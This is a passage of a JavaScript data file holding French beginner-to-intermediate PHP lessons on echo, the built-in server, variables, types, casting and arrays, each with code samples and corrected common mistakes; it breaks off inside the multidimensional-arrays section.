/* ============================================================
   data-php.js — Contenu pédagogique PHP (module complet)
   Couvre : fondamentaux & serveur local, variables & types,
   casting, tableaux (plats, multi, fonctions), conditions,
   boucles, fonctions (base, avancées, anonymes), superglobales,
   formulaires & validation & upload, inclusion, POO (classes,
   visibilité, héritage, interfaces/traits), erreurs & exceptions,
   sessions & cookies, PDO/CRUD/requêtes préparées, sécurité
   (mots de passe, XSS, CSRF), Composer & PSR-4, API REST,
   namespaces.
   Même contrat de données (cf. README.md).
   ============================================================ */
window.DEVDOCS = window.DEVDOCS || {};

DEVDOCS.php = {
  id: 'php',
  name: 'PHP',
  icon: 'php',
  tagline: 'Le langage qui exécute le web côté serveur : du premier echo aux API JSON, en passant par la POO, PDO et Composer.',
  heroTitle: 'PHP, du premier echo à l\'API complète',

  categories: [
    /* ======================================================
       1. FONDAMENTAUX
       ====================================================== */
    {
      id: 'fondamentaux',
      name: 'Fondamentaux',
      icon: 'terminal',
      fiches: [
        {
          id: 'php-fondamentaux',
          title: 'Balises, echo & intégration HTML',
          icon: 'php',
          level: 'Débutant',
          tagline: 'Balises, echo et commentaires — comment PHP se glisse dans ton HTML sans que le navigateur ne le sache jamais.',
          intro: 'PHP (créé par Rasmus Lerdorf en 1994, aujourd\'hui « PHP: Hypertext Preprocessor ») est un langage **exécuté côté serveur**. Retiens l\'image du restaurant : PHP est en cuisine, le navigateur est en salle — il ne reçoit que le plat fini (du HTML), jamais la recette. Comprendre cette séparation, c\'est comprendre 80 % de ce qui déroute les débutants.',
          blocks: [
            { t: 'h3', h: 'Les balises : la porte d\'entrée de PHP' },
            { t: 'p', h: 'Un fichier .php est du **HTML par défaut**, qui bascule en mode « code » uniquement entre `<?php` et `?>`. Tout ce qui est hors de ces balises est envoyé tel quel au navigateur. C\'est ce qui rend PHP si naturel pour mélanger logique et présentation.' },
            { t: 'code', lang: 'php', label: 'index.php', code:
'<!DOCTYPE html>\n<html lang="fr">\n<head><title>Marché de Dantokpa</title></head>\n<body>\n  <h1>Bienvenue à Dantokpa</h1>\n  <?php\n    // On entre en mode PHP : tout ici est exécuté sur le serveur\n    $ville = "Cotonou";\n    echo "<p>Page générée à " . date("H:i") . " depuis " . $ville . "</p>";\n  ?>\n  <p>Ce paragraphe est du HTML pur, PHP n\'y touche pas.</p>\n</body>\n</html>' },
            { t: 'callout', kind: 'tip', h: 'Si un fichier contient **uniquement du PHP** (config, fonctions, classes), la convention est d\'**omettre le `?>` final**. Un espace ou saut de ligne après `?>` serait envoyé au navigateur et casserait les `header()`/`session_start()` plus tard (« headers already sent »).' },
            { t: 'h3', h: 'echo et print : afficher' },
            { t: 'p', h: '`echo` est une **construction du langage** (pas une vraie fonction) : pas de parenthèses obligatoires, accepte plusieurs arguments, microscopiquement plus rapide. `print` ressemble mais retourne toujours `1` et ne prend qu\'un argument. En pratique : utilise `echo` partout, et sache lire `print` dans du vieux code.' },
            { t: 'code', lang: 'php', code:
'$produit = "gari";\n$prix = 500;\n\necho "Un sac de " . $produit . " coûte " . $prix . " FCFA.\\n";  // concaténation avec .\necho "Formaté : {$produit} — {$prix} FCFA\\n";                    // interpolation (guillemets doubles !)\necho "Une ligne", " et ", "une autre", " d\'un coup\\n";          // plusieurs arguments OK avec echo\n\n// Cours forcé sur les quotes :\necho \'Prix : $prix\';   // affiche littéralement : Prix : $prix\necho "Prix : $prix";   // affiche : Prix : 500' },
            { t: 'table', head: ['Outil', 'Rôle', 'Retiens'], rows: [
              ['`echo`', 'afficher du texte', 'celui que tu utiliseras 99 % du temps'],
              ['`print`', 'afficher aussi (retourne 1)', 'héritage historique, sache le lire'],
              ['`var_dump()`', 'afficher type + valeur (débogage)', 'ton meilleur ami pour apprendre'],
              ['`print_r()`', 'dump lisible (tableaux)', 'pratique en pré-débogage rapide']
            ] },
            { t: 'h3', h: 'Les trois façons de commenter' },
            { t: 'code', lang: 'php', code:
'// Commentaire de fin de ligne (le plus courant)\n\n# Commentaire de fin de ligne style shell (rare, héritage historique)\n\n/*\n   Commentaire sur plusieurs lignes.\n   Parfait pour documenter un bloc entier ou désactiver\n   temporairement du code pendant un test.\n*/\n\n// un commentaire seul sur une ligne = pas de point-virgule nécessaire' },
            { t: 'h3', h: 'PHP et HTML imbriqués : le vrai super-pouvoir' },
            { t: 'p', h: 'On peut **sortir du mode PHP en plein milieu d\'un bloc**, produire du HTML, puis rentrer. Avec la syntaxe alternative (`:` … `endforeach;`, `endif;`), les gabarits restent lisibles — c\'est l\'ancêtre des moteurs de templates. Tu connais déjà le HTML (module HTML) : ici, on lui injecte juste de la vie.' },
            { t: 'code', lang: 'php', code:
'<?php\n$vendeuses = ["Awa Mensah", "Koffi Adjoa", "Séra Dossou"];\n?>\n<ul>\n  <?php foreach ($vendeuses as $vendeuse): ?>\n    <!-- on est sorti du PHP : du HTML normal, coloré par l\'éditeur -->\n    <li><?= $vendeuse ?></li>\n  <?php endforeach; ?>\n</ul>\n<p>Nombre de vendeuses : <?= count($vendeuses) ?></p>' },
            { t: 'callout', kind: 'info', h: '`<?= $x ?>` est un raccourci officiel et universel pour `<?php echo $x; ?>`. Par contre le court métrage `<?` (sans =, short_open_tag) est souvent désactivé et confus : à éviter.' }
          ],
          errors: [
            { title: 'Oublier le point-virgule', lang: 'php', bad:
'echo "Bonjour Cotonou"\necho "Il fait chaud"', good:
'echo "Bonjour Cotonou";\necho "Il fait chaud";', why: 'PHP assemble les instructions tant qu\'il n\'a pas vu de ;. Il signale alors une Parse error… sur la LIGNE SUIVANTE, ce qui déroute : « unexpected T_ECHO » veut dire « cherche le ; manquant juste au-dessus ».' },
            { title: 'Faire des echo de 40 lignes de HTML', lang: 'php', bad:
'echo "<div class=\\"card\\"><h2>Tableau</h2>";\necho "<table border=\\"1\\"><tr><th>Sac</th><th>Prix</th></tr>";\necho "<tr><td>gari</td><td>500</td></tr></table></div>";', good:
'?>\n<div class="card">\n  <h2>Tableau</h2>\n  <table><tr><td>gari</td><td><?= $prix ?> FCFA</td></tr></table>\n</div>\n<?php', why: 'Échapper les guillemets dans des echo géants est illisible et source de bugs. Le mode mixte (sortir du PHP avec ?> puis rentrer) est exactement fait pour ça.' }
          ],
          related: ['php-serveur-local', 'html-structure', 'php-variables', 'php-inclusion']
        },

        {
          id: 'php-serveur-local',
          title: 'Exécuter PHP : serveur local & cycle HTTP',
          icon: 'dns',
          level: 'Débutant',
          tagline: 'php -S, phpinfo(), Apache/Nginx + PHP-FPM — et pourquoi un double-clic sur index.php ne marchera jamais.',
          intro: 'PHP ne s\'exécute pas dans le navigateur : il a besoin d\'un **serveur web** qui reçoit la requête HTTP, la passe à PHP, puis renvoie le HTML produit. En développement, PHP embarque son propre mini-serveur — une seule commande suffit. En production, on confie le travail à Apache ou Nginx qui délèguent à **PHP-FPM**.',
          blocks: [
            { t: 'h3', h: 'Le cycle d\'une requête, du clic à la réponse' },
            { t: 'ol', items: [
              'Le navigateur demande `http://localhost:8000/panier.php` (au BÉNÉFICE du protocole HTTP — jamais `file://`).',
              'Le serveur web (Apache/Nginx, ou le serveur intégré) voit un .php : il n\'envoie PAS le fichier brut.',
              'PHP lit et exécute le fichier : chaque `echo` alimente la réponse.',
              'Le serveur renvoie le HTML produit (code 200, en-têtes…) au navigateur.',
              'le navigateur affiche le résultat — impossible de revoir le code PHP d\'origine.'
            ] },
            { t: 'h3', h: 'Démarrer en dix secondes : le serveur intégré' },
            { t: 'code', lang: 'bash', code:
'# Vérifier l\'installation\nphp -v          # PHP 8.3.x (cli)…\n\n# Depuis le dossier du projet, lance le serveur de DÉVELOPPEMENT :\nphp -S localhost:8000\n\n# Avec une racine dédiée (recommandé : seul "public/" est exposé) :\nphp -S localhost:8000 -t public\n\n# → http://localhost:8000 dans le navigateur : ça tourne !' },
            { t: 'code', lang: 'php', label: 'info.php — le test traditionnel', code:
'<?php\n// Affiche la configuration complète de PHP (version, extensions, php.ini)\nphpinfo();\n// Ouvre http://localhost:8000/info.php : tout PHP en un coup d\'œil\n// ⚠ Supprime ce fichier avant toute mise en ligne : il révèle ta config.' },
            { t: 'callout', kind: 'warn', h: 'Le serveur intégré est **mono-requête et sans optimisation** : parfait pour apprendre, interdit en production. En vrai déploiement : Nginx/Apache + PHP-FPM (voir plus bas).' },
            { t: 'h3', h: 'PHP-FPM, en bref' },
            { t: 'p', h: 'En production, Nginx (ou Apache) ne sait pas exécuter PHP lui-même : il parle à **PHP-FPM** (FastCGI Process Manager), un gestionnaire qui maintient un **parc de processus PHP** prêts à travailler. Nginx reçoit la requête, la transmet à FPM via FastCGI, récupère la réponse. Chaque requête part de zéro : pas d\'état conservé entre deux appels (d\'où les sessions — fiche dédiée).' },
            { t: 'table', head: ['Option', 'Usage', 'Retiens'], rows: [
              ['`php -S`', 'développement local', 'une commande, zéro config'],
              ['Apache + mod_php', 'hébergements mutualisés', 'PHP dans le processus Apache'],
              ['Nginx + PHP-FPM', 'production moderne', 'séparation nette, performant'],
              ['`php script.php`', 'CLI (scripts, cron)', 'PHP sans HTTP du tout !']
            ] },
            { t: 'h3', h: 'PHP en ligne de commande' },
            { t: 'p', h: 'PHP est aussi un langage de script : `php taches.php` exécute le fichier hors de tout serveur web. C\'est comme ça que tournent les commandes Composer, les migrations, les cron. Dans ce monde-là, `$_GET`, `$_POST` et les sessions n\'existent pas : il n\'y a pas de requête HTTP.' }
          ],
          errors: [
            { title: 'Double-cliquer sur index.php', lang: 'php', bad:
'// Tu ouvres file:///home/toi/projet/index.php dans Chrome\n// Résultat : le navigateur AFFICHE le code source PHP, rien ne s\'exécute', good:
'// Terminal, depuis le dossier projet :\nphp -S localhost:8000\n// Puis http://localhost:8000/index.php dans le navigateur', why: 'PHP s\'exécute sur un serveur, à la demande du serveur web. En file:// aucun serveur n\'intervient : le navigateur lit le fichier comme du texte. Le protocole http:// est la condition de vie de PHP.' },
            { title: 'Servir tout son disque comme racine web', lang: 'php', bad:
'cd / && php -S localhost:8000          # tout le disque exposé !\nphp -S localhost:8000 -t ~              # documents, clés, .env…', good:
'php -S localhost:8000 -t public\n# config.php, .env, vendor/ restent HORS de public/', why: 'La racine web (document root) est la seule porte d\'entrée du monde extérieur. Tout ce qui est dessous est téléchargeable. On y met les fichiers publics (index.php, css, images) ; le reste vit à côté, hors de portée.' }
          ],
          related: ['php-fondamentaux', 'php-inclusion', 'php-superglobales', 'lv-fondamentaux']
        }
      ]
    },

    /* ======================================================
       2. VARIABLES & TYPES
       ====================================================== */
    {
      id: 'variables',
      name: 'Variables & types',
      icon: 'data_object',
      fiches: [
        {
          id: 'php-variables',
          title: 'Variables & typage dynamique',
          icon: 'label',
          level: 'Débutant',
          tagline: 'Le fameux $, l\'affectation, les quotes simples vs doubles — et la mention avancée des variables variables.',
          intro: 'En PHP, toute variable commence par **`$`** et se crée à la première affectation : pas de déclaration, pas de type annoncé — le type est **déduit de la valeur** et peut changer en cours de route (typage dynamique et faible). Cette souplesse fait la rapidité d\'apprentissage de PHP… et quelques-uns de ses pièges historiques.',
          blocks: [
            { t: 'h3', h: 'Déclarer, nommer' },
            { t: 'code', lang: 'php', code:
'$vendeuse = "Awa Mensah";   // string\n$prix_sac = 500;            // int\n$taux_tva = 0.18;           // float\n$en_stock = true;           // bool\n\n// Règles de nom : lettre ou _ suivi de lettres, chiffres, _\n$_compteur = 1;             // OK\n$prixTotal = 1200;          // OK (convention camelCase courante)\n// $2sacs = 2;  ✗ invalide : commence par un chiffre\n// $prix-total = 5; ✗ le tiret est l\'opérateur moins ici !\n\n$ville = "Cotonou";\n$Ville = "Abomey-Calavi";   // ⚠ PHP distingue la casse : deux variables !' },
            { t: 'callout', kind: 'warn', h: 'Les noms de variables sont **sensibles à la casse** (`$ville` ≠ `$Ville`), mais pas les noms de fonctions (`ECHO` marche — ne le fais pas). Conventions : `camelCase` ou `snake_case`, mais sois constant dans un projet.' },
            { t: 'h3', h: 'Quotes simples vs doubles : l\'interpolation' },
            { t: 'p', h: 'Entre **guillemets doubles**, PHP remplace les variables par leur valeur (interpolation) ; entre **apostrophes**, la chaîne est prise au pied de la lettre. La concaténation se fait avec l\'opérateur `.` (point) — point de détail : les accolades `{ }` autour du nom lèvent toute ambiguïté sur la fin de la variable.' },
            { t: 'code', lang: 'php', code:
'$produit = "gari";\n$prix = 500;\n\necho "Un sac de $produit coûte $prix FCFA.";       // interpolation ✓\necho "Un sac de {$produit}s ? {$prix} FCFA.";      // {...} : frontière claire\necho \'Un sac de $produit\';                        // AFFICHE $produit, tel quel !\necho \'Prix : \' . $prix . \' FCFA\';               // concaténation avec le point' },
            { t: 'h3', h: 'Le type suit la valeur' },
            { t: 'code', lang: 'php', code:
'$x = 100;          // int\n$x = "cent";        // désormais string — légal, mais à manier avec soin\n\n// Vérifier en apprenant :\nvar_dump($x);       // string(4) "cent"\n$rien = null;       // null : "pas de valeur"\n// isset($inconnue)  → false : une variable jamais créée n\'existe pas' },
            { t: 'h3', h: 'Mention avancée : les variables variables' },
            { t: 'p', h: 'PHP permet de nommer une variable… avec le CONTENU d\'une autre : `$$nom`. Séduisant sur le papier (données dynamiques, imports), c\'est en pratique illisible, quasiment introuvable par recherche textuelle et remplaçable à 99 % par un **tableau associatif**. Sache le reconnaître — et choisis le tableau.' },
            { t: 'code', lang: 'php', code:
'$champ = "ville";\n$$champ = "Cotonou";   // crée… $ville !\n\necho $ville;           // Cotonou\necho ${$champ};        // Cotonou aussi\n\n// ✅ La version lisible : un tableau\n$data = [];\n$data[$champ] = "Cotonou";\necho $data["ville"];' },
            { t: 'h3', h: 'Herodoc… heredoc !' },
            { t: 'p', h: 'Pour les longs textes multi-lignes, PHP offre la syntaxe **heredoc** (`<<<FIN`) qui interpole comme les guillemets doubles, et **nowdoc** (`<<<\'FIN\'`) qui n\'interpole pas. Pratique pour un e-mail ou un bloc HTML généré.' },
            { t: 'code', lang: 'php', code:
'$nom = "Awa";\n$message = <<<MAIL\nBonjour $nom,\nVotre commande de gari est prête au marché de Dantokpa.\nMAIL;\necho $message;' }
          ],
          errors: [
            { title: 'Oublier le $', lang: 'php', bad:
'vendeuse = "Awa";\necho vendeuse;', good:
'$vendeuse = "Awa";\necho $vendeuse;', why: 'Sans $, PHP croit lire une CONSTANTE non définie (Fatal error depuis PHP 8, notice poétique avant). Le $ n\'est pas décoratif : c\'est le marqueur syntaxique de la variable, à la déclaration comme à l\'usage.' },
            { title: 'Attendre de l\'interpolation entre apostrophes', lang: 'php', bad:
'echo \'Total : $total FCFA\';   // affiche littéralement $total', good:
'echo "Total : $total FCFA";\n// ou : echo \'Total : \' . $total . \' FCFA\';', why: 'Entre apostrophes, PHP n\'interprète RIEN (sauf \\\' et \\\\). Si le nom de la variable s\'affiche au lieu de sa valeur, c\'est presque toujours une histoire de quotes.' }
          ],
          related: ['php-types', 'php-casting', 'php-tableaux', 'php-conditions']
        },

        {
          id: 'php-types',
          title: 'Types : scalaires, composés & var_dump',
          icon: 'category',
          level: 'Débutant',
          tagline: 'bool, int, float, string ; array, object ; resource, null — et la boîte à outils is_*, isset, empty, var_dump.',
          intro: 'PHP connaît une dizaine de types rangés en trois familles : **scalaires** (une seule valeur), **composés** (contiennent d\'autres valeurs) et **spéciaux** (`null`, `resource`). Comme le typage est dynamique, c\'est toi qui vérifies — d\'où l\'importance des fonctions d\'inspection. Bien les connaître, c\'est savoir **ce que tu manipules vraiment**.',
          blocks: [
            { t: 'h3', h: 'Les quatre scalaires' },
            { t: 'table', head: ['Type', 'Exemples', 'Pièges classiques'], rows: [
              ['`bool`', '`true`, `false`', '`"false"` n\'est PAS faux : c\'est une chaîne non vide !'],
              ['`int`', '`500`, `-12`, `0x1A`, `0b101`', 'pas de séparateur de milliers ; `_` autorisé : `1_000_000`'],
              ['`float`', '`0.18`, `1.5e3`', 'précision binaire : `0.1 + 0.2 !== 0.3`'],
              ['`string`', '`"gari"`, `\'FCFA\'`', 'octets, pas unicode natif : fonctions `mb_*` pour les accents']
            ] },
            { t: 'h3', h: 'Composés & spéciaux' },
            { t: 'ul', items: [
              '`array` : LA structure reine de PHP — liste ET dictionnaire à la fois (fiches Tableaux).',
              '`object` : instance de classe (fiches POO).',
              '`callable` : une fonction « passable » en paramètre (fiche Fonctions anonymes).',
              '`resource` : poignée vers quelque chose d\'externe (connexion BDD, fichier ouvert) — on ne l\'affiche pas, on la passe aux fonctions ad hoc.',
              '`null` : une seule valeur, `NULL` — « pas de valeur », différent de vide.'
            ] },
            { t: 'h3', h: 'Inspecter : var_dump, gettype' },
            { t: 'code', lang: 'php', code:
'$test = [500, "FCFA", 0.18, true, null];\n\nvar_dump($test[0]);      // int(500)\nvar_dump($test[1]);      // string(4) "FCFA"\nvar_dump($test[2]);      // float(0.18)\nvar_dump($test[4]);      // NULL\n\necho gettype($test[3]);  // boolean\necho gettype(0.5);       // double   ← alias historique de float, ne t\'étonne pas' },
            { t: 'h3', h: 'Les prédicats is_* — et le trio isset / empty / is_null' },
            { t: 'code', lang: 'php', code:
'is_int(500)          // true\nis_string("500")      // true\nis_numeric("500")     // true : chaîne numérique acceptée\nis_array([])          // true\nis_bool(false)        // true  ← attention, ça teste le TYPE, pas la vérité\n\n$nom = "Awa";\nisset($nom)      // true  → la variable EXISTE et n\'est pas null\nisset($rien)     // false → jamais déclarée\nempty($nom)      // false → non vide\nempty("")        // true  → vide ("" , "0", 0, [], null, false…)\nis_null(null)    // true  → exactement null' },
            { t: 'callout', kind: 'warn', h: '`empty("0")` retourne **true** ! Une quantité saisie "0" dans un formulaire serait jugée « vide ». Pour les nombres métier, préfère `$x === ""` ou `is_numeric($x)` à `empty()`.' },
            { t: 'h3', h: 'Comparaison rapide' },
            { t: 'table', head: ['Expression', '"" ', ' "0" ', ' 0 ', ' null '], rows: [
              ['`isset($x)` si $x défini', 'true', 'true', 'true', '**false**'],
              ['`empty($x)`', 'true', 'true', 'true', 'true'],
              ['`is_null($x)`', 'false', 'false', 'false', 'true']
            ] }
          ],
          errors: [
            { title: 'Utiliser isset() là où il faut empty() (ou l\'inverse)', lang: 'php', bad:
'$qte = $_GET[\'qte\'] ?? "";\nif (isset($qte)) { /* commande passée… sauf que "" existe ! */ }', good:
'$qte = $_GET[\'qte\'] ?? "";\nif ($qte !== "" && is_numeric($qte)) { /* vraie quantité */ }\n// empty($qte) aurait rejeté "0" — choisis l\'outil selon le métier', why: 'isset répond « existe et non null ? », empty répond « est considéré vide ? ». Un champ de formulaire vide EXISTE (il vaut ""). Confondre les deux fait valider des chaînes vides — ou rejeter le zéro légitime.' },
            { title: 'Additionner des floats et exiger l\'égalité', lang: 'php', bad:
'if (0.1 + 0.2 === 0.3) { echo "égal"; }  // jamais affiché !', good:
'$somme = 0.1 + 0.2;\nif (abs($somme - 0.3) < 0.00001) { echo "égal à epsilon près"; }\n// Argent : travaille en CENTIMES (int) — 100 = 1,00 FCFA…', why: 'Les floats sont stockés en binaire : 0.1 n\'a pas de représentation exacte, l\'addition dérive légèrement. Test d\'égalité stricte sur des floats = bug latent. Epsilon, BCMath, ou des entiers.' }
          ],
          related: ['php-variables', 'php-casting', 'php-tableaux', 'php-conditions']
        },

        {
          id: 'php-casting',
          title: 'Casting, jonglage de types & ===',
          icon: 'swap_horiz',
          level: 'Intermédiaire',
          tagline: 'PHP convertit tout seul… parfois contre ton gré. Apprends le casting explicite, et pourquoi === sauve des vies.',
          intro: 'PHP est historiquement **faiblement typé** : il convertit silencieusement les types quand le contexte l\'exige (« jonglage de types »). Pratique pour `"5" + 3`, dangereux pour les comparaisons. La stratégie de pro : **caster soi-même à l\'entrée**, **comparer strictement avec `===`**, et activer `strict_types` dans les nouveaux fichiers.',
          blocks: [
            { t: 'h3', h: 'Le jonglage : ce que PHP fait dans ton dos' },
            { t: 'code', lang: 'php', code:
'"5" + "3"        // 8 (int) : les chaînes numériques deviennent des nombres\n"5" . 3          // "53" : le . force le CONTEXTE string\n"10 sacs" + 2    // 12 (+ notice) : PHP lit le préfixe numérique\n// Depuis PHP 8 : "sacs" + 2 → TypeError (sanctuarisation !)\n\n0 == "a"         // PHP 7 : true (chaîne→0) — PHP 8 : false, ouf\nnull == false    // true\n"" == false      // true\n"1" == true      // true' },
            { t: 'callout', kind: 'info', h: 'Depuis PHP 8, la comparaison `0 == "chaine"` a été corrigée (ne cast plus la chaîne vers 0). Reste que la règle d\'or ne bouge pas : **qui veut éviter les surprises compare avec `===`**.' },
            { t: 'h3', h: 'Caster explicitement' },
            { t: 'code', lang: 'php', code:
'$saisie = "42 sacs";\n\n(int) $saisie;         // 42\n(int) "abc";           // 0   ← silencieux : voilà le danger\n(float) "0.18";        // 0.18\n(string) 500;          // "500"\n(bool) "0";            // FALSE (piège légendaire !)\n(bool) "false";        // TRUE  (chaîne non vide)\n(array) "gari";        // ["gari"]\n\n// Alternatives fonctionnelles souvent plus lisibles :\nintval("42 sacs");     // 42\nfloatval("0.18");      // 0.18\nstrval(500);           // "500"' },
            { t: 'h3', h: '=== : la comparaison qui respecte les types' },
            { t: 'code', lang: 'php', code:
'"1" == 1      // true  (jongle)\n"1" === 1      // false (string ≠ int) ✓ fiable\n\n// En entrée de formulaire, TOUT arrive en string :\n$age = $_POST[\'age\'] ?? "";           // "18" (string)\nif ($age === 18) { }                    // false… et heureusement qu\'on le sait\nif ((int) $age === 18) { }              // ✓ caster PUIS comparer strictement\n\nin_array(0, ["a", "b"])               // true 🤯 (jongle)\nin_array(0, ["a", "b"], true)         // false ✓ 3e argument = strict' },
            { t: 'h3', h: 'strict_types : un garde-fou moderne' },
            { t: 'code', lang: 'php', label: 'haut de fichier', code:
'declare(strict_types=1);   // TOUTE première instruction du fichier\n\nfunction prix_total(int $qte, float $prix): float {\n    return $qte * $prix;\n}\n\nprix_total(3, 500.0);     // OK\n// prix_total("3", "500"); // TypeError ! Les types ne jonglent plus ici.' },
            { t: 'callout', kind: 'tip', h: '`strict_types` ne change que les **appels de fonctions faits depuis ce fichier**. Active-le dans tous tes nouveaux fichiers : les erreurs remontent au plus tôt, là où vit le bug.' }
          ],
          errors: [
            { title: '== « par habitude »', lang: 'php', bad:
'$role = $_POST[\'role\'] ?? "";\nif ($role == 0) { accorder_admin(); }     // "0", 0, false, ""… passent !\nif ($statut == true) { }                  // n\'importe quelle chaîne non vide…', good:
'if ($role === "0") { /* explicitement la chaîne "0" */ }\nif ($statut === true) { /* uniquement le booléen true */ }\nif ((int) $qte === 0) { /* cast maîtrisé puis === */ }', why: '== demande à PHP de jongler avec les types des deux côtés : les tables de conversion réservent des égalités contre-intuitives (et source de failles : "0" == false a déboursé des bypass d\'authentification). === compare type ET valeur : zéro surprise.' },
            { title: 'Caster pour valider une saisie', lang: 'php', bad:
'$qte = (int) $_POST[\'qte\'];    // "abc" → 0 : SILENCIEUX\ncommander($qte);                  // commande de 0 sacs validée…', good:
'$brut = $_POST[\'qte\'] ?? "";\nif (!is_numeric($brut) || (int) $brut <= 0) {\n    $erreurs[] = "Quantité invalide.";\n} else {\n    commander((int) $brut);       // validation AVANT le cast\n}', why: 'Le cast transforme sans protester : une donnée pourrie devient 0 ou false sans bruit. Caster sert à CHANGER de type une valeur déjà validée — la validation (filter_var, is_numeric) est une autre étape, qui vient d\'abord.' }
          ],
          related: ['php-variables', 'php-types', 'php-conditions', 'php-validation']
        }
      ]
    },

    /* ======================================================
       3. TABLEAUX
       ====================================================== */
    {
      id: 'tableaux',
      name: 'Tableaux',
      icon: 'table_chart',
      fiches: [
        {
          id: 'php-tableaux',
          title: 'Tableaux indexés & associatifs',
          icon: 'table_rows',
          level: 'Débutant',
          tagline: 'UN seul type array pour les listes ET les dictionnaires : la structure reine de PHP, avec [] et count().',
          intro: 'Contrairement à beaucoup de langages, PHP ne sépare pas « liste » et « dictionnaire » : le type `array` fait les deux — indexés par des entiers OU par des chaînes, et même mélangés. C\'est la structure de données la plus utilisée du langage ; les superglobales, les résultats SQL, les configs… sont des tableaux.',
          blocks: [
            { t: 'h3', h: 'Indexés : listes ordonnées' },
            { t: 'code', lang: 'php', code:
'$marche = ["gari", "ignames", "piment", "huile de palme"];\n$legacy = array("gari", "ignames");   // syntaxe historique, identique\n\necho $marche[0];       // gari (l\'index commence à 0 !)\necho count($marche);   // 4\n\n$marche[] = "gombo";   // ajout en fin — index 5 ? non : 4\n$marche[] = "attiéké"; // index 5\n\n// foreach = LA boucle des tableaux (fiche Boucles)\nforeach ($marche as $i => $article) {\n    echo "$i : $article\\n";\n}' },
            { t: 'h3', h: 'Associatifs : clé ⇒ valeur' },
            { t: 'code', lang: 'php', code:
'$prix = [\n    "gari"   => 500,     // clé string => valeur\n    "igname" => 300,\n    "piment" => 200,\n];\n\necho $prix["gari"];            // 500\n$prix["gombo"] = 150;          // ajout/modif par clé\nunset($prix["piment"]);        // suppression\n\nforeach ($prix as $produit => $montant) {\n    echo "$produit : $montant FCFA\\n";\n}' },
            { t: 'callout', kind: 'info', h: 'Les **clés sont uniquement `int` ou `string`**. Et PHP normalise en silence : `"8"` devient la clé int `8`, `true` devient `1`, `08.7` tronque à `8`. Les tableaux restent **ordonnés par ordre d\'insertion** — pas par clé.' },
            { t: 'h3', h: 'Boîte à outils de survie' },
            { t: 'table', head: ['Fonction', 'Rôle'], rows: [
              ['`count($t)`', 'nombre d\'éléments'],
              ['`array_key_exists("gari", $t)`', 'la clé existe (même si valeur null)'],
              ['`isset($t["gari"])`', 'clé présente ET valeur non null'],
              ['`array_keys($t)` / `array_values($t)`', 'extraire clés / valeurs'],
              ['`unset($t["x"])`', 'retirer une entrée'],
              ['`$t["x"] ?? "défaut"`', 'lecture avec repli — le réflexe anti-warning']
            ] },
            { t: 'code', lang: 'php', code:
'// Le réflexe moderne, à tout endroit où la clé peut manquer :\n$prix_gari   = $prix["gari"]   ?? 0;\n$prix_tomate = $prix["tomate"] ?? "non vendu";\n\n// vs l\'ancien monde :\n$prix_tomate = isset($prix["tomate"]) ? $prix["tomate"] : "non vendu";' }
          ],
          errors: [
            { title: 'Lire une clé qui n\'existe pas', lang: 'php', bad:
'echo $prix["tomate"];\n// Warning: Undefined array key "tomate" (PHP 8)', good:
'echo $prix["tomate"] ?? "indisponible";\n// ou : if (array_key_exists("tomate", $prix)) { ... }', why: 'Depuis PHP 8, l\'accès à une clé absente émet un warning (notice avant) EN PLUS de retourner null. En logs propres/tests stricts, ça pollue ; en métier, ça masque des fautes de frappe. Le ?? du réflexe lecture est la solution.' },
            { title: 'Modifier via foreach par valeur', lang: 'php', bad:
'foreach ($prix as $montant) {\n    $montant = $montant * 1.18;   // copie locale : $prix INTACT\n}', good:
'foreach ($prix as $produit => $montant) {\n    $prix[$produit] = (int) round($montant * 1.18);  // écrit via la clé\n}\n// ou avec la référence : foreach ($prix as &$m) { $m *= 1.18; }', why: 'foreach passe une COPIE de chaque valeur dans la variable de boucle. Pour modifier le tableau, il faut soit réécrire par la clé, soit demander explicitement la référence (&$m — voir fiche Boucles pour son piège !).' }
          ],
          related: ['php-tableaux-multi', 'php-fonctions-tableaux', 'php-boucles', 'php-variables']
        },

        {
          id: 'php-tableaux-multi',
          title: 'Tableaux multidimensionnels',
          icon: 'grid_on',
          level: 'Intermédiaire',
          tagline: 'Des tableaux dans des tableaux : modéliser un vrai panier de marché, le lire, le parcourir sans s\'y perdre.',
          intro: 'Un élément de tableau peut lui-même être un tableau : c\'est ainsi qu\'on modélise des lignes de BDD, un panier, un catalogue… en attendant les objets. Deux réflexes font la différence : **nommer clairement les variables de boucles imbriquées**, et **protéger les accès profonds** avec `??`.',
          blocks: [
            { t: 'h3', h: 'Modéliser : lignes et structures' },
            { t: 'code', lang: 'php', code:
'// Une table "SQL-like" : tableau de lignes (chacune associative)\n$produits = [\n    ["nom" => "gari",   "prix" => 500, "stock" => 12],\n    ["nom" => "igname", "prix" => 300, "stock" => 30],\n];\n\necho $produits[0]["nom"];        // gari\necho $produits[1]["prix"];       // 300\n\n// Structure métier : le marché de Dantokpa en arborescence\n$marche = [\n    "gari"  => ["sacs" => ["blanc", "jaune"], "prix_sac" => 500],\n    "legumes" => ["piment" => 200, "gombo" => 150],\n];\n\necho $marche["gari"]["sacs"][0]; // blanc\necho $marche["gari"]["prix_sac"];// 500' },
            { t: 'h3', h: 'Parcourir : foreach imbriqués' },
            { t: 'code', lang: 'php', code:
'$total = 0;\nforeach ($produits as $produit) {          // chaque LIGNE\n    echo $produit["nom"] . " : ";\n    foreach ($produit as $champ => $valeur) {  // chaque CHAMP\n        echo "$champ=$valeur ";\n    }\n    echo "\\n";\n    $total += $produit["prix"] * $produit["stock"];\n}\necho "Valeur du stock : $total FCFA";' },
            { t: 'callout', kind: 'warn', h: 'Ne réutilise jamais **le même nom** de variable dans deux foreach imbriqués (`foreach ($t as $v)` dans `foreach ($t as $v)`) : la boucle interne écrase celle de l\'externe. `$produit`/`$champ`, `$commande`/`$ligne` — des noms métier, pas `$a`/`$b`.' },
            { t: 'h3', h: 'Accès profond sécurisé' },
            { t: 'code', lang: 'php', code:
'// ?? enchaîne les replis à chaque étage — propre et silencieux\n$prix = $marche["gari"]["sacs"][0] ?? "introuvable";\n\n// Compter en profondeur :\necho count($marche, COUNT_RECURSIVE);  // éléments + sous-éléments\n\n// Aller-retour avec JSON (le monde des API — fiche dédiée)\n$json = json_encode($marche, JSON_UNESCAPED_UNICODE);\n$retour = json_decode($json, true);    // true = tableaux associatifs' },
            { t: 'p', h: 'Le pont tableaux ⇄ JSON est **exactement la raison** pour laquelle maîtriser les tableaux multicouches paie si vite : une API REST n\'est autre que `json_encode` d\'un tableau — et un `fetch` côté front le reçoit tel quel (fiche `api rest`).' }
          ],
          errors: [
            { title: 'Descendre trois étages d\'un coup', lang: 'php', bad:
